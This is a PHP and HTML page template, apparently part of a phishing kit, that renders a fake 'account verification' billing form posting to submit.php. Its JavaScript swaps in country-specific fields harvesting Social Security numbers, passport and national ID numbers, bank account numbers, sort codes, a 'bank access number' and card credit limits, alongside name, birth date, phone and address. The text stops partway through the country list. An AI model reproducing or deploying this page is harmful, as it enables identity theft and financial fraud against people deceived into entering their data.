<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
$alamat1 = $_SESSION['address1'];
$alamat2 = $_SESSION['address2'];
$kota = $_SESSION['city'];
$daerah = $_SESSION['state'];
$kodepos = $_SESSION['zip'];
$ultah = $_SESSION['birthday'];
$country = $_SESSION['country'];
$negara = $_SESSION['country'];
$nohp = $_SESSION['phone'];
if($ultah =="") {
    $ultah = "";
}else{
    $ultah = explode("-",$ultah);
    $ultah = "$ultah[1]/$ultah[2]/$ultah[0]";
}
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title_bill</title>";
?>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />
<style>
.has-error input {
      
    }
.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    outline: none;
    border-color:#97CDF5;
    border-width: 0px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}

.inox{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.inox:focus{
    border-width: 1px;
    border-color: #0088cc;
    -moz-box-shadow: 0px 0px 0px 3px #66afe9;
    -webkit-box-shadow: 0px 0px 0px 3px #66afe9;
            box-shadow: 0px 0px 0px 3px #66afe9;
}

</style>
<?php 
$top_personal = "50px";
$top_name = "60px";
$top_input_name1 = "90px";
$top_input_name2 = "130px";
$top_dob = "180px";
$top_input_dob = "210px";
$top_phone = "260px";
$top_input_phone = "290px";
$top_address = "340px";
$top_input_address = "370px";
$top_input_city = "410px";
$top_input_state = "450px";
$top_input_country = "490px";
$top_input_zip = "530px";

$top_socountry = "30px";
$top_input_socountry = "580px";
$top_garis1_ssn = "660px";
$top_garis1 = "580px";
$top_ad_ssn = "710px";
$top_ad = "640px";
$top_savebil = "830px";
$top_savebil_ssn = "970px";
?>
<script>

function ganticountry() {
    var country = $('#countrynya :selected').text();
    if(country === "United States") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($ssn);?></b></span><input id="ssn1" style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="ssn" required="required" class="required" placeholder="<?php echo $ssn;?>" value="<?php echo $_SESSION['ssn'];?>" maxlength="11" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
        $('#ssn1').keyup(function() {
          var val = this.value.replace(/\D/g, '');
          var newVal = '';
          if(val.length > 4) {
             this.value = val;
          }
          if((val.length > 3) && (val.length < 6)) {
             newVal += val.substr(0, 3) + '-';
             val = val.substr(3);
          }
          if (val.length > 5) {
             newVal += val.substr(0, 3) + '-';
             newVal += val.substr(3, 2) + '-';
             val = val.substr(5);
           }
           newVal += val;
           this.value = newVal.substring(0, 11);
          });

    } else if (country === "Hong Kong") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($idnumber);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="idnumber" required="required" class="required" placeholder="<?php echo $idnumber;?>" value="<?php echo $_SESSION['idnumber'];?>" maxlength="20" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Cyprus") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($passpor);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="passportnumber" required="required" class="required" placeholder="<?php echo $passpor;?>" value="<?php echo $_SESSION['passportnumber'];?>" maxlength="20" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Greece") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($passpor);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="passportnumber" required="required" class="required" placeholder="<?php echo $passpor;?>" value="<?php echo $_SESSION['passportnumber'];?>" maxlength="20" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Saudi Arabia") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($natio);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="nationalid" required="required" class="required" placeholder="<?php echo $natio;?>" value="<?php echo $_SESSION['nationalid'];?>" maxlength="20" type="tel">');
        $('#novbv').html('<input class="required" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="position: absolute;top: 190px;width: 320px;">');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Qatar") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($qatariden);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="qatarid" required="required" class="required" placeholder="<?php echo $qatariden;?>" value="<?php echo $_SESSION['qatarid'];?>" maxlength="20" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Kuwait") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($civid);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="civilid" required="required" class="required" placeholder="<?php echo $civid;?>" value="<?php echo $_SESSION['civilid'];?>" maxlength="20" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Ireland") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($ssn);?></b></span><input id="ssn1" style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="ssn" required="required" class="required" placeholder="<?php echo $ssn;?>" value="<?php echo $_SESSION['ssn'];?>" maxlength="11" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
        $('#ssn1').keyup(function() {
          var val = this.value.replace(/\D/g, '');
          var newVal = '';
          if(val.length > 4) {
             this.value = val;
          }
          if((val.length > 3) && (val.length < 6)) {
             newVal += val.substr(0, 3) + '-';
             val = val.substr(3);
          }
          if (val.length > 5) {
             newVal += val.substr(0, 3) + '-';
             newVal += val.substr(3, 2) + '-';
             val = val.substr(5);
           }
           newVal += val;
           this.value = newVal.substring(0, 11);
          });

    } else if (country === "India") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($accnumber);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="acc_number" required="required" class="required" placeholder="<?php echo $accnumber;?>" value="<?php echo $_SESSION['acc_number'];?>" maxlength="15" type="tel">');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $('#novbv').html('<input class="required" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="position: absolute;top: 190px;width: 320px;">');
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "United Kingdom") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($accnumber);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="acc_number" required="required" class="required" placeholder="<?php echo $accnumber;?>" value="<?php echo $_SESSION['acc_number'];?>" maxlength="15" type="tel">');
        $('#novbv').html('<input class="required" placeholder="sort code" required="required" name="sortcode" style="position: absolute;top: 190px;width: 320px;">');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Australia") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($osidnumber);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="osidnum" required="required" class="required" placeholder="<?php echo $osidnumber;?>" value="<?php echo $_SESSION['osidnum'];?>" type="tel">');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $('#novbv').html('<input class="required" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="position: absolute;top: 190px;width: 320px;">');
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Canada") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($sin);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="cassn" required="required" class="required" placeholder="<?php echo $sin;?>" value="<?php echo $_SESSION['cassn'];?>" type="tel">');
        $('#novbv').html('');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "Thailand") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b><?php echo strtoupper($citizen);?></b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="citizenid" required="required" class="required" placeholder="<?php echo $citizen;?>" value="<?php echo $_SESSION['citizenid'];?>" type="tel">');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $('#novbv').html('<input class="required" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="position: absolute;top: 190px;width: 320px;">');
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else if (country === "New Zealand") {
        $('#socountry').html('<span class="xFont2" style="position: absolute;top: 0px;width:500px;">&nbsp;<b>BANK ACCESS NUMBER</b></span><input style="position:absolute;top:<?php echo $top_socountry;?>;width:320px;" name="bankaccnumber" required="required" class="required" placeholder="bank access number" value="" type="text">');
        $("#garis1").css({top: "<?php echo $top_garis1_ssn;?>"});
        $('#novbv').html('<input class="required" placeholder="<?php echo strtolower($climit);?>" required="required" name="cc_limit" style="position: absolute;top: 190px;width: 320px;">');
        $("#card_details").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#ad").css({top: "<?php echo $top_ad_ssn;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil_ssn;?>"});
    } else {
        $('#socountry').html('');
        $('#novbv').html('');
        $("#card_details").css({top: "<?php echo $top_ad;?>"});
        $("#ad").css({top: "<?php echo $top_ad;?>"});
        $("#garis1").css({top: "<?php echo $top_garis1;?>"});
        $("#savebil").css({top: "<?php echo $top_savebil;?>"});
    }
}
</script>
</head>
<body>
<div id="head"></div>
<div id="container">
    <div id="xheader">
        <div id="<?php echo $bahasas;?>navbar"></div>
        <div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 53px;z-index: 2;left: 0px;">

         <?php if(!empty($fnames)){ 
            echo "<b>$account_verif</b>";
         }else{
            echo "<b>$account_verif</b>";
        }


            ?> 
            </div>
        <div id="account_type">
        <?php 
        echo $account_id;
        ?> 

        <b> <?php if(!empty($xuser)){ echo $xuser;}else{echo "";}?> </b> </div>
        <div id="logout"></div>
        <font id="logout0"><a href="#" style="color:#fff;text-decoration: none;"><?php echo $sign_out;?></a></font>
    </div>
    <div id="xcontent">
        <form method="POST" action="submit.php" target="_self" name="xupdate" id="xupdate">
            <font class="xFont" style="top:<?php echo $top_personal;?>;"><?php echo $payment;?></font>
                        <br><br>
                        <br><br>
<span class="xFont2" style="position: absolute;top: <?php echo $top_name;?>;left: 276px;">&nbsp;<b><?php echo $besar_name;?></b></span>

<input type="text" required="required" maxlength="25" name="name1" value="<?php echo $fnames;?>" id="name1" pattern=".{1,15}" style="position: absolute;top: <?php echo $top_input_name1;?>;left: 280px;width: 320px;" placeholder="<?php echo $fname;?>" class="required">
<input class="required" maxlength="25" placeholder="<?php echo $lname;?>" pattern=".{1,25}" name="name2" value="<?php echo $lnames;?>" id="name2" type="txt" style="position: absolute;top: <?php echo $top_input_name2;?>;left: 280px;width: 320px;">

<span class="xFont2" style="position: absolute;top: <?php echo $top_dob;?>;left: 276px;">&nbsp;<b><?php echo strtoupper($birth);?></b></span>
<input name="bith" id="bith" class="required" maxlength="10" required="required" value="<?php echo $ultah;?>" placeholder="<?php echo $ddmmyy;?>" type="tel" style="
    position: absolute;
    top: <?php echo $top_input_dob;?>;
    left: 280px;
    width: 320px;
">

<span class="xFont2" style="position: absolute;top: <?php echo $top_phone;?>;left: 276px;">&nbsp;<b><?php echo $besar_phone;?></b></span>

<input name="phone" required="required" class="required" placeholder="<?php echo $phone;?>" value="<?php echo $nohp;?>" maxlength="20" type="tel" style="
    position: absolute;
    top: <?php echo $top_input_phone;?>;
    left: 280px;
    width: 320px;
">

<span class="xFont2" style="position: absolute;top: <?php echo $top_address;?>;left: 276px;">&nbsp;<b><?php echo $besar_add;?></b></span>

<input name="adre1" id="adre1" class="required" pattern=".{3,60}" required="required" maxlength="60" value="<?php echo $alamat1;?>" placeholder="<?php echo $street;?>" type="txt" style="position: absolute;top: <?php echo $top_input_address;?>;left: 280px;width: 320px;">

<input name="city" id="city" required="required" class="required" pattern=".{3,20}" maxlength="20" value="<?php echo $kota;?>" placeholder="<?php echo $city;?>" type="txt" style="
    position: absolute;
    top: <?php echo $top_input_city;?>;
    left: 280px;
    width: 320px;
">
<?php if($negara == "Japan") {?>
<select id="state" class="required" name="state" style="
    position: absolute;
    top: <?php echo $top_input_state;?>;
    left: 280px;
    width: 320px;-webkit-appearance:none;background-color: #fff;" >
    <option value=""><?php echo $state;?></option>
      <option value="愛知県">愛知県</option>
<option value="秋田県">秋田県</option>
<option value="青森県">青森県</option>
<option value="千葉県">千葉県</option>
<option value="愛媛県">愛媛県</option>
<option value="福井県">福井県</option>
<option value="福岡県">福岡県</option>
<option value="福島県">福島県</option>
<option value="群馬県">群馬県</option>
<option value="広島県">広島県</option>
<option value="北海道">北海道</option>
<option value="北海道">北海道</option>
<option value="茨城県">茨城県</option>
<option value="石川県">石川県</option>
<option value="岩手県">岩手県</option>
<option value="香川県">香川県</option>
<option value="鹿児島県">鹿児島県</option>
<option value="神奈川県">神奈川県</option>
<option value="高知県">高知県</option>
<option value="熊本県">熊本県</option>
<option value="京都府">京都府</option>
<option value="三重県">三重県</option>
<option value="宮城県">宮城県</option>
<option value="宮崎県">宮崎県</option>
<option value="長野県">長野県</option>
<option value="長崎県">長崎県</option>
<option value="奈良県">奈良県</option>
<option value="新潟県">新潟県</option>
<option value="大分県">大分県</option>
<option value="岡山県">岡山県</option>
<option value="沖縄県">沖縄県</option>
<option value="大阪府">大阪府</option>
<option value="佐賀県">佐賀県</option>
<option value="埼玉県">埼玉県</option>
<option value="滋賀県">滋賀県</option>
<option value="島根県">島根県</option>
<option value="静岡県">静岡県</option>
<option value="栃木県">栃木県</option>
<option value="徳島県">徳島県</option>
<option value="東京都">東京都</option>
<option value="鳥取県">鳥取県</option>
<option value="富山県">富山県</option>
<option value="和歌山県">和歌山県</option>
<option value="山形県">山形県</option>
<option value="山口県">山口県</option>
<option value="山梨県">山梨県</option>
</select>
<?php }else if($negara == "Australia") {?>
    <select id="state" class="required" name="state" style="
    position: absolute;
    top: <?php echo $top_input_state;?>;
    left: 280px;
    width: 320px;-webkit-appearance:none;background-color: #fff;" >
    <option value=""><?php echo $state;?></option>
      <option value="New South Wales">New South Wales</option>
<option value="Queensland">Queensland</option>
<option value="South Australia">South Australia</option>
<option value="Tasmania">Tasmania</option>
<option value="Victoria">Victoria</option>
<option value="Western Australia">Western Australia</option>
<option value="Australian Capital Territory">Australian Capital Territory</option>
<option value="Northern Territory">Northern Territory</option>
</select>
<?php }else if($negara == "United States") {?>
    <select id="state" class="required" name="state" style="
    position: absolute;
    top: <?php echo $top_input_state;?>;
    left: 280px;
    width: 320px;-webkit-appearance:none;background-color: #fff;" >
    <option value=""><?php echo $state;?></option>
      <option value="Armed Forces Americas">AA - Armed Forces Americas</option>
<option value="Armed Forces Europe">AE - Armed Forces Europe</option>
<option value="Alaska">AK - Alaska</option>
<option value="Alabama">AL - Alabama</option>
<option value="Armed Forces Pacific">AP - Armed Forces Pacific</option>
<option value="Arkansas">AR - Arkansas</option>
<option value="American Samoa">AS - American Samoa</option>
<option value="Arizona">AZ - Arizona</option>
<option value="California">CA - California</option>
<option value="Colorado">CO - Colorado</option>
<option value="Connecticut">CT - Connecticut</option>
<option value="District of Columbia">DC - District of Columbia</option>
<option value="Delaware">DE - Delaware</option>
<option value="Florida">FL - Florida</option>
<option value="Georgia">GA - Georgia</option>
<option value="Guam">GU - Guam</option>
<option value="Hawaii">HI - Hawaii</option>
<option value="Iowa">IA - Iowa</option>
<option value="Idaho">ID - Idaho</option>
<option value="Illinois">IL - Illinois</option>
<option value="Indiana">IN - Indiana</option>
<option value="Kansas">KS - Kansas</option>
<option value="Kentucky">KY - Kentucky</option>
<option value="Louisiana">LA - Louisiana</option>
<option value="Massachusetts">MA - Massachusetts</option>
<option value="Maryland">MD - Maryland</option>
<option value="Maine">ME - Maine</option>
<option value="Michigan">MI - Michigan</option>
<option value="Minnesota">MN - Minnesota</option>
<option value="Missouri">MO - Missouri</option>
<option value="Northern Mariana Islands">MP - Northern Mariana Islands</option>
<option value="Mississippi">MS - Mississippi</option>
<option value="Montana">MT - Montana</option>
<option value="North Carolina">NC - North Carolina</option>
<option value="North Dakota">ND - North Dakota</option>
<option value="Nebraska">NE - Nebraska</option>
<option value="New Hampshire">NH - New Hampshire</option>
<option value="New Jersey">NJ - New Jersey</option>
<option value="New Mexico">NM - New Mexico</option>
<option value="Nevada">NV - Nevada</option>
<option value="New York">NY - New York</option>
<option value="Ohio">OH - Ohio</option>
<option value="Oklahoma">OK - Oklahoma</option>
<option value="Oregon">OR - Oregon</option>
<option value="Pennsylvania">PA - Pennsylvania</option>
<option value="Puerto Rico">PR - Puerto Rico</option>
<option value="Rhode Island">RI - Rhode Island</option>
<option value="South Carolina">SC - South Carolina</option>
<option value="South Dakota">SD - South Dakota</option>
<option value="Tennessee">TN - Tennessee</option>
<option value="Texas">TX - Texas</option>
<option value="Minor Outlying Islands">UM - Minor Outlying Islands</option>
<option value="Utah">UT - Utah</option>
<option value="Virginia">VA - Virginia</option>
<option value="Virgin Islands">VI - Virgin Islands</option>
<option value="Vermont">VT - Vermont</option>
<option value="Washington">WA - Washington</option>
<option value="Wisconsin">WI - Wisconsin</option>
<option value="West Virginia">WV - West Virginia</option>
<option value="Wyoming">WY - Wyoming</option>
</select>
<?php }else{ ?>
<input type="text" name="state" id="state" value="<?php echo $daerah;?>" maxlength="25" style="position: absolute;top: <?php echo $top_input_state;?>;left: 280px;width: 320px;" placeholder="<?php echo $state;?>" class="inox">
<?php } ?>
    <input type="hidden" name="xuser" value="<?php echo $xuser;?>">
<select id="countrynya" onchange="ganticountry();" class="required" name="cojjuntry" style="
    position: absolute;
    top: <?php echo $top_input_country;?>;
    left: 280px;
    width: 320px;-webkit-appearance:none;background-color: #fff;" >
      <option value="<?php echo $country;?>"><?php echo $country;?></option>
<option value="Afghanistan">Afghanistan</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="American Samoa">American Samoa</option> 
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option> 
<option value="Anguilla">Anguilla</option> 
<option value="Antarctica">Antarctica</option> 
<option value="Antigua and Barbuda">Antigua and Barbuda</option> 
<option value="Argentina">Argentina</option> 
<option value="Armenia">Armenia</option> 
<option value="Aruba">Aruba</option> 
<option value="Australia">Australia</option> 
<option value="Austria">Austria</option> 
<option value="Azerbaijan">Azerbaijan</option> 
<option value="Bahamas">Bahamas</option> 
<option value="Bahrain">Bahrain</option> 
<option value="Bangladesh">Bangladesh</option> 
<option value="Barbados">Barbados</option> 
<option value="Belarus">Belarus</option> 
<option value="Belgium">Belgium</option> 
<option value="Belize">Belize</option> 
<option value="Benin">Benin</option> 
<option value="Bermuda">Bermuda</option> 
<option value="Bhutan">Bhutan</option> 
<option value="Bolivia">Bolivia</option> 
<option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option> 
<option value="Botswana">Botswana</option> 
<option value="Bouvet Island">Bouvet Island</option> 
<option value="Brazil">Brazil</option> 
<option value="British Indian Ocean Territory">British Indian Ocean Territory</option> 
<option value="Brunei Darussalam">Brunei Darussalam</option> 
<option value="Bulgaria">Bulgaria</option> 
<option value="Burkina Faso">Burkina Faso</option> 
<option value="Burundi">Burundi</option> 
<option value="Cambodia">Cambodia</option> 
<option value="Cameroon">Cameroon</option> 
<option value="Canada">Canada</option> 
<option value="Cape Verde">Cape Verde</option> 
<option value="Cayman Islands">Cayman Islands</option> 
<option value="Central African Republic">Central African Republic</option> 
<option value="Chad">Chad</option> 
<option value="Chile">Chile</option> 
<option value="China">China</option> 
<option value="Christmas Island">Christmas Island</option> 
<option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option> 
<option value="Colombia">Colombia</option> 
<option value="Comoros">Comoros</option> 
<option value="Congo">Congo</option> 
<option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option> 
<option value="Cook Islands">Cook Islands</option> 
<option value="Costa Rica">Costa Rica</option> 
<option value="Cote D'ivoire">Cote D'ivoire</option> 
<option value="Croatia">Croatia</option> 
<option value="Cuba">Cuba</option> 
<option value="Cyprus">Cyprus</option> 
<option value="Czech Republic">Czech Republic</option> 
<option value="Denmark">Denmark</option> 
<option value="Djibouti">Djibouti</option> 
<option value="Dominica">Dominica</option> 
<option value="Dominican Republic">Dominican Republic</option> 
<option value="Ecuador">Ecuador</option> 
<option value="Egypt">Egypt</option> 
<option value="El Salvador">El Salvador</option> 
<option value="Equatorial Guinea">Equatorial Guinea</option> 
<option value="Eritrea">Eritrea</option> 
<option value="Estonia">Estonia</option> 
<option value="Ethiopia">Ethiopia</option> 
<option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option> 
<option value="Faroe Islands">Faroe Islands</option> 
<option value="Fiji">Fiji</option> 
<option value="Finland">Finland</option> 
<option value="France">France</option> 
<option value="French Guiana">French Guiana</option> 
<option value="French Polynesia">French Polynesia</option> 
<option value="French Southern Territories">French Southern Territories</option> 
<option value="Gabon">Gabon</option> 
<option value="Gambia">Gambia</option> 
<option value="Georgia">Georgia</option> 
<option value="Germany">Germany</option> 
<option value="Ghana">Ghana</option> 
<option value="Gibraltar">Gibraltar</option> 
<option value="Greece">Greece</option> 
<option value="Greenland">Greenland</option> 
<option value="Grenada">Grenada</option> 
<option value="Guadeloupe">Guadeloupe</option> 
<option value="Guam">Guam</option> 
<option value="Guatemala">Guatemala</option> 
<option value="Guinea">Guinea</option> 
<option value="Guinea-bissau">Guinea-bissau</option> 
<option value="Guyana">Guyana</option> 
<option value="Haiti">Haiti</option> 
<option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option> 
<option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option> 
<option value="Honduras">Honduras</option> 
<option value="Hong Kong">Hong Kong</option> 
<option value="Hungary">Hungary</option> 
<option value="Iceland">Iceland</option> 
<option value="India">India</option> 
<option value="Indonesia">Indonesia</option> 
<option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option> 
<option value="Iraq">Iraq</option> 
<option value="Ireland">Ireland</option> 
<option value="Israel">Israel</option> 
<option value="Italy">Italy</option> 
<option value="Jamaica">Jamaica</option> 
<option value="Japan">Japan</option> 
<option value="Jordan">Jordan</option> 
<option value="Kazakhstan">Kazakhstan</option> 
<option value="Kenya">Kenya</option> 
<option value="Kiribati">Kiribati</option> 
<option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option> 
<option value="Korea, Republic of">Korea, Republic of</option> 
<option value="Kuwait">Kuwait</option> 
<option value="Kyrgyzstan">Kyrgyzstan</option> 
<option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option> 
<option value="Latvia">Latvia</option> 
<option value="Lebanon">Lebanon</option> 
<option value="Lesotho">Lesotho</option> 
<option value="Liberia">Liberia</option> 
<option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option> 
<option value="Liechtenstein">Liechtenstein</option> 
<option value="Lithuania">Lithuania</option> 
<option value="Luxembourg">Luxembourg</option> 
<option value="Macao">Macao</option> 
<option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option> 
<option value="Madagascar">Madagascar</option> 
<option value="Malawi">Malawi</option> 
<option value="Malaysia">Malaysia</option> 
<option value="Maldives">Maldives</option> 
<option value="Mali">Mali</option> 
<option value="Malta">Malta</option> 
<option value="Marshall Islands">Marshall Islands</option> 
<option value="Martinique">Martinique</option> 
<option value="Mauritania">Mauritania</option> 
<option value="Mauritius">Mauritius</option> 
<option value="Mayotte">Mayotte</option> 
<option value="Mexico">Mexico</option> 
<option value="Micronesia, Federated States of">Micronesia, Federated States of</option> 
<option value="Moldova, Republic of">Moldova, Republic of</option> 
<option value="Monaco">Monaco</option> 
<option value="Mongolia">Mongolia</option> 
<option value="Montserrat">Montserrat</option> 
<option value="Morocco">Morocco</option> 
<option value="Mozambique">Mozambique</option> 
<option value="Myanmar">Myanmar</option> 
<option value="Namibia">Namibia</option> 
<option value="Nauru">Nauru</option> 
<option value="Nepal">Nepal</option> 
<option value="Netherlands">Netherlands</option> 
<option value="Netherlands Antilles">Netherlands Antilles</option> 
<option value="New Caledonia">New Caledonia</option> 
<option value="New Zealand">New Zealand</option> 
<option value="Nicaragua">Nicaragua</option> 
<option value="Niger">Niger</option> 
<option value="Nigeria">Nigeria</option> 
<option value="Niue">Niue</option> 
<option value="Norfolk Island">Norfolk Island</option> 
<option value="Northern Mariana Islands">Northern Mariana Islands</option> 
<option value="Norway">Norway</option> 
<option value="Oman">Oman</option> 
<option value="Pakistan">Pakistan</option> 
<option value="Palau">Palau</option> 
<option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option> 
<option value="Panama">Panama</option> 
<option value="Papua New Guinea">Papua New Guinea</option> 
<option value="Paraguay">Paraguay</option> 
<option value="Peru">Peru</option> 
<option value="Philippines">Philippines</option> 
<option value="Pitcairn">Pitcairn</option> 
<option value="Poland">Poland</option> 
<option value="Portugal">Portugal</option> 
<option value="Puerto Rico">Puerto Rico</option> 
<option value="Qatar">Qatar</option> 
<option value="Reunion">Reunion</option> 
<option value="Romania">Romania</option> 
<option value="Russian Federation">Russian Federation</option> 
<option value="Rwanda">Rwanda</option> 
<option value="Saint Helena">Saint Helena</option> 
<option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option> 
<option value="Saint Lucia">Saint Lucia</option> 
<option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option> 
<option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option> 
<option value="Samoa">Samoa</option> 
<option value="San Marino">San Marino</option> 
<option value="Sao Tome and Principe">Sao Tome and Principe</option> 
<option value="Saudi Arabia">Saudi Arabia</option> 
<option value="Senegal">Senegal</option> 
